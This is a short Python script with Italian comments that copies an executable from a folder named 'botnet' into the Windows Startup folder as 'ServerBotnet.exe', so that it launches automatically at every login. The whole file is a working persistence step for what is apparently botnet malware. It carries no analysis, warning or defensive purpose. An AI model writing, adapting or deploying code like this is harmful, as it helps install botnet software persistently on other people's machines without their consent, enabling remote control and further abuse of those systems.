import os
import shutil

# Percorso del file .exe
exe_path = r"C:\Users\blue-terminal\Desktop\botnet\dist\server.exe"

# Percorso della cartella di avvio automatico
startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

# Copia il file .exe nella cartella di avvio
shutil.copy2(exe_path, os.path.join(startup_folder, 'ServerBotnet.exe'))